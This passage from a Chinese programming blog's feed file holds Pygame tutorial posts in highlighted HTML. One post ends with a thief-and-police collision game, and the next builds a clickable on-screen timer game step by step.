comment">#刷新屏幕</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="六、碰撞检测"><a href="#六、碰撞检测" class="headerlink" title="六、碰撞检测"></a>六、碰撞检测</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> email<span class="token punctuation">.</span>mime <span class="token keyword">import</span> image<span class="token keyword">import</span> sys<span class="token punctuation">,</span>pygame <span class="token comment"># 常数</span>size <span class="token operator">=</span> width<span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">800</span><span class="token punctuation">,</span><span class="token number">600</span>      <span class="token comment"># 窗体大小</span>black <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>white <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span>                          fps <span class="token operator">=</span> <span class="token number">200</span>start <span class="token operator">=</span> <span class="token boolean">True</span><span class="token comment"># 游戏设置</span>pygame<span class="token punctuation">.</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span> screen <span class="token operator">=</span> pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_mode<span class="token punctuation">(</span>size<span class="token punctuation">)</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_caption<span class="token punctuation">(</span><span class="token string">'神偷魅影'</span><span class="token punctuation">)</span> fclock <span class="token operator">=</span> pygame<span class="token punctuation">.</span>time<span class="token punctuation">.</span>Clock<span class="token punctuation">(</span><span class="token punctuation">)</span>                  <span class="token comment">#时钟对象用于设置fps</span><span class="token comment"># 人类、属性是移动速度，方法是会移动，并且还会撞墙</span><span class="token keyword">class</span> <span class="token class-name">man</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 初始属性</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>init_speed<span class="token punctuation">,</span>image_url<span class="token punctuation">,</span>init_position<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>init_speed <span class="token operator">=</span> init_speed                    <span class="token comment"># 初始速度</span>        self<span class="token punctuation">.</span>speed <span class="token operator">=</span> <span class="token punctuation">[</span>self<span class="token punctuation">.</span>init_speed<span class="token punctuation">,</span>self<span class="token punctuation">.</span>init_speed<span class="token punctuation">]</span>  <span class="token comment"># 实际速度（横坐标速度和纵坐标速度）</span>        <span class="token comment"># 人类实际上是从图片类进化而来</span>        self<span class="token punctuation">.</span>image <span class="token operator">=</span> pygame<span class="token punctuation">.</span>image<span class="token punctuation">.</span>load<span class="token punctuation">(</span>image_url<span class="token punctuation">)</span>       <span class="token comment">#图片对象</span>        self<span class="token punctuation">.</span>imageRect <span class="token operator">=</span> self<span class="token punctuation">.</span>image<span class="token punctuation">.</span>get_rect<span class="token punctuation">(</span><span class="token punctuation">)</span>          <span class="token comment">#获得正切矩形对象，具有左右顶底四个属性，具有移动等方法 </span>        self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>left <span class="token operator">=</span> init_position<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>          <span class="token comment">#初始位置(横坐标)</span>        self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>top <span class="token operator">=</span> init_position<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>           <span class="token comment">#初始位置(纵坐标)</span>    <span class="token comment"># 移动控制，←↓→↑改变方向</span>    <span class="token keyword">def</span> <span class="token function">moveControl</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>Key<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key <span class="token operator">==</span> Key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>self<span class="token punctuation">.</span>init_speed        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key <span class="token operator">==</span> Key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>init_speed        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key <span class="token operator">==</span> Key<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>init_speed        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key <span class="token operator">==</span> Key<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>self<span class="token punctuation">.</span>init_speed    <span class="token comment"># 碰壁反弹</span>    <span class="token keyword">def</span> <span class="token function">crashWall</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>left <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">or</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>right <span class="token operator">&gt;</span> width<span class="token punctuation">:</span>                self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">-</span> self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>top <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">or</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>bottom <span class="token operator">&gt;</span> height<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">-</span> self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token comment"># 移动</span>    <span class="token keyword">def</span> <span class="token function">move</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>imageRect <span class="token operator">=</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>move<span class="token punctuation">(</span>self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token comment">#正切矩形对象运动</span>        screen<span class="token punctuation">.</span>blit<span class="token punctuation">(</span>self<span class="token punctuation">.</span>image<span class="token punctuation">,</span> self<span class="token punctuation">.</span>imageRect<span class="token punctuation">)</span>          <span class="token comment">#将一个图像绘制在另一个图像上，使图片对象和正切矩形对象一起运动</span><span class="token comment"># 碰撞检测</span><span class="token keyword">def</span> <span class="token function">crashMan</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">abs</span><span class="token punctuation">(</span>theif<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>left <span class="token operator">-</span> police<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>left<span class="token punctuation">)</span> <span class="token operator">&lt;</span> theif<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>right<span class="token operator">-</span>theif<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>left<span class="token punctuation">)</span>    <span class="token keyword">and</span> <span class="token punctuation">(</span><span class="token builtin">abs</span><span class="token punctuation">(</span>theif<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>top <span class="token operator">-</span> police<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>top<span class="token punctuation">)</span> <span class="token operator">&lt;</span> theif<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>bottom<span class="token operator">-</span>theif<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>top<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        gameOver<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 游戏结束，停止运行</span><span class="token keyword">def</span> <span class="token function">gameOver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> start    start <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token comment"># 类的实例化，这次实例两个对象</span>theif <span class="token operator">=</span> man<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"thief.jpg"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span>police <span class="token operator">=</span> man<span class="token punctuation">(</span><span class="token number">1.2</span><span class="token punctuation">,</span><span class="token string">"police.jpg"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> event <span class="token keyword">in</span> pygame<span class="token punctuation">.</span>event<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment">#退出事件</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>QUIT<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>KEYDOWN<span class="token punctuation">:</span> <span class="token comment">#键盘事件</span>            theif<span class="token punctuation">.</span>moveControl<span class="token punctuation">(</span><span class="token punctuation">[</span>pygame<span class="token punctuation">.</span>K_LEFT<span class="token punctuation">,</span>pygame<span class="token punctuation">.</span>K_RIGHT<span class="token punctuation">,</span>pygame<span class="token punctuation">.</span>K_DOWN<span class="token punctuation">,</span>pygame<span class="token punctuation">.</span>K_UP<span class="token punctuation">]</span><span class="token punctuation">)</span>            police<span class="token punctuation">.</span>moveControl<span class="token punctuation">(</span><span class="token punctuation">[</span>pygame<span class="token punctuation">.</span>K_a<span class="token punctuation">,</span>pygame<span class="token punctuation">.</span>K_d<span class="token punctuation">,</span>pygame<span class="token punctuation">.</span>K_s<span class="token punctuation">,</span>pygame<span class="token punctuation">.</span>K_w<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> start<span class="token punctuation">:</span>        screen<span class="token punctuation">.</span>fill<span class="token punctuation">(</span>white<span class="token punctuation">)</span>                   <span class="token comment">#每一帧结束后都把屏幕重新刷白</span>        theif<span class="token punctuation">.</span>crashWall<span class="token punctuation">(</span><span class="token punctuation">)</span>        theif<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token punctuation">)</span>        police<span class="token punctuation">.</span>crashWall<span class="token punctuation">(</span><span class="token punctuation">)</span>        police<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token punctuation">)</span>        crashMan<span class="token punctuation">(</span><span class="token punctuation">)</span>        fclock<span class="token punctuation">.</span>tick<span class="token punctuation">(</span>fps<span class="token punctuation">)</span>                     <span class="token comment">#设置fps</span>        pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>              <span class="token comment">#刷新屏幕</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>技能你们自己加吧，发挥你们想象力吧，现在这篇项目已经很长了，我就不继续往下写了，先告辞了😎</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 项目教学 </tag>
            
            <tag> Pygame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python游戏开发1—到五秒就停下</title>
      <link href="/2022/03/01/Python%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%911%E2%80%94%E5%88%B0%E4%BA%94%E7%A7%92%E5%B0%B1%E5%81%9C%E4%B8%8B/"/>
      <url>/2022/03/01/Python%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%911%E2%80%94%E5%88%B0%E4%BA%94%E7%A7%92%E5%B0%B1%E5%81%9C%E4%B8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Pygame最小开发框架"><a href="#一、Pygame最小开发框架" class="headerlink" title="一、Pygame最小开发框架"></a>一、Pygame最小开发框架</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token punctuation">,</span>pygame pygame<span class="token punctuation">.</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span>                               <span class="token comment"># 初始化</span>screen<span class="token operator">=</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_mode<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 设置屏幕宽高</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_caption<span class="token punctuation">(</span><span class="token string">'游戏之旅'</span><span class="token punctuation">)</span>       <span class="token comment"># 设置标题名称</span> <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token comment"># 事件队列</span>    <span class="token keyword">for</span> event <span class="token keyword">in</span> pygame<span class="token punctuation">.</span>event<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 退出事件</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>QUIT<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 刷新屏幕</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二、绘制文字"><a href="#二、绘制文字" class="headerlink" title="二、绘制文字"></a>二、绘制文字</h2><p>先绘制“开始游戏”在屏幕上吧。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token punctuation">,</span>pygame<span class="token keyword">import</span> pygame<span class="token punctuation">.</span>freetype<span class="token comment"># 定义颜色</span>black <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>white <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span>red <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">0</span> pygame<span class="token punctuation">.</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment"># 初始化</span>screen<span class="token operator">=</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_mode<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 设置屏幕宽高</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_caption<span class="token punctuation">(</span><span class="token string">'游戏之旅'</span><span class="token punctuation">)</span>       <span class="token comment"># 设置标题名称</span>f1 <span class="token operator">=</span> pygame<span class="token punctuation">.</span>freetype<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token string">r"C:\Windows\Fonts\msyh.ttc"</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span>  <span class="token comment"># 设置文字对象</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token comment"># 事件队列</span>    <span class="token keyword">for</span> event <span class="token keyword">in</span> pygame<span class="token punctuation">.</span>event<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 退出事件</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>QUIT<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    screen<span class="token punctuation">.</span>fill<span class="token punctuation">(</span>white<span class="token punctuation">)</span>       <span class="token comment">#整个屏幕填充白色</span>    f1rect <span class="token operator">=</span> f1<span class="token punctuation">.</span>render_to<span class="token punctuation">(</span>screen<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"开始计时/停止计时"</span><span class="token punctuation">,</span>fgcolor<span class="token operator">=</span>black<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">)</span>    pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 刷新屏幕</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、显示计时"><a href="#三、显示计时" class="headerlink" title="三、显示计时"></a>三、显示计时</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token punctuation">,</span>pygame<span class="token punctuation">,</span>time<span class="token keyword">import</span> pygame<span class="token punctuation">.</span>freetype<span class="token comment"># 定义颜色</span>black <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>white <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span>red <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">0</span> pygame<span class="token punctuation">.</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment"># 初始化</span>screen<span class="token operator">=</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_mode<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 设置屏幕宽高</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_caption<span class="token punctuation">(</span><span class="token string">'游戏之旅'</span><span class="token punctuation">)</span>       <span class="token comment"># 设置标题名称</span>f1 <span class="token operator">=</span> pygame<span class="token punctuation">.</span>freetype<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token string">r"C:\Windows\Fonts\msyh.ttc"</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span>  <span class="token comment"># 设置文字对象</span>count <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment">#计时的时间（s）</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token comment"># 事件队列</span>    <span class="token keyword">for</span> event <span class="token keyword">in</span> pygame<span class="token punctuation">.</span>event<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 退出事件</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>QUIT<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 计时</span>    count <span class="token operator">+=</span> <span class="token number">0.1</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    screen<span class="token punctuation">.</span>fill<span class="token punctuation">(</span>white<span class="token punctuation">)</span>       <span class="token comment">#整个屏幕填充白色</span>    f1rect <span class="token operator">=</span> f1<span class="token punctuation">.</span>render_to<span class="token punctuation">(</span>screen<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"开始计时/停止计时"</span><span class="token punctuation">,</span>fgcolor<span class="token operator">=</span>black<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">)</span>    <span class="token comment">#round()以四舍五入的方式保留几位小数</span>    f1rect <span class="token operator">=</span> f1<span class="token punctuation">.</span>render_to<span class="token punctuation">(</span>screen<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">round</span><span class="token punctuation">(</span>count<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>fgcolor<span class="token operator">=</span>black<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">)</span>     pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 刷新屏幕</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、控制计时"><a href="#四、控制计时" class="headerlink" title="四、控制计时"></a>四、控制计时</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token punctuation">,</span>pygame<span class="token punctuation">,</span>time<span class="token keyword">import</span> pygame<span class="token punctuation">.</span>freetype<span class="token comment"># 定义颜色</span>black <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>white <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span>red <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">0</span> pygame<span class="token punctuation">.</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment"># 初始化</span>screen<span class="token operator">=</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_mode<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 设置屏幕宽高</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_caption<span class="token punctuation">(</span><span class="token string">'游戏之旅'</span><span class="token punctuation">)</span>       <span class="token comment"># 设置标题名称</span>f1 <span class="token operator">=</span> pygame<span class="token punctuation">.</span>freetype<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token string">r"C:\Windows\Fonts\msyh.ttc"</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span>  <span class="token comment"># 设置文字对象</span>count <span class="token operator">=</span> <span class="token number">0</span>          <span class="token comment">#计时的时间（s）</span>start <span class="token operator">=</span> <span class="token boolean">False</span>      <span class="token comment"># 开始计时控制</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token comment"># 事件队列</span>    <span class="token keyword">for</span> event <span class="token keyword">in</span> pygame<span class="token punctuation">.</span>event<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 退出事件</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>QUIT<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> event<span class="token punctuation">.</span><span class="token builtin">type</span> <span class="token operator">==</span> pygame<span class="token punctuation">.</span>MOUSEBUTTONDOWN<span class="token punctuation">:</span>            <span class="token keyword">if</span> f1rect<span class="token punctuation">.</span>left<span class="token operator">&lt;</span>event<span class="token punctuation">.</span>pos<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>f1rect<span class="token punctuation">.</span>right <span class="token keyword">and</span> f1rect<span class="token punctuation">.</span>top<span class="token operator">&lt;</span>event<span class="token punctuation">.</span>pos<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>f1rect<span class="token punctuation">.</span>bottom<span class="token punctuation">:</span>                <span class="token keyword">if</span> start <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span> <span class="token comment">#如果此时没有开始计时，那么就开始计时</span>                    start <span class="token operator">=</span> <span class="token boolean">True</span>                    count <span class="token operator">=</span> <span class="token number">0</span>      <span class="token comment">#重新开始计时的时候把计时清零</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>              <span class="token comment">#如果已经开始计时了，再按就停止</span>                    start <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token comment">#如果开始计时，那么每隔0.1s，计时+0.1</span>    <span class="token keyword">if</span> start <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        count <span class="token operator">+=</span> <span class="token number">0.1</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    screen<span class="token punctuation">.</span>fill<span class="token punctuation">(</span>white<span class="token punctuation">)</span>       <span class="token comment">#整个屏幕填充白色</span>    f1rect <span class="token operator">=</span> f1<span class="token punctuation">.</span>render_to<span class="token punctuation">(</span>screen<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"开始计时/停止计时"</span><span class="token punctuation">,</span>fgcolor<span class="token operator">=</span>black<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">)</span>    <span class="token comment">#round()以四舍五入的方式保留几位小数</span>    CountRect<span class="token operator">=</span>f1<span class="token punctuation">.</span>render_to<span class="token punctuation">(</span>screen<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"计时："</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">round</span><span class="token punctuation">(</span>count<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"s"</span><span class="token punctuation">,</span>fgcolor<span class="token operator">=</span>black<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">)</span>    pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 刷新屏幕</span><span aria-hidden="true" 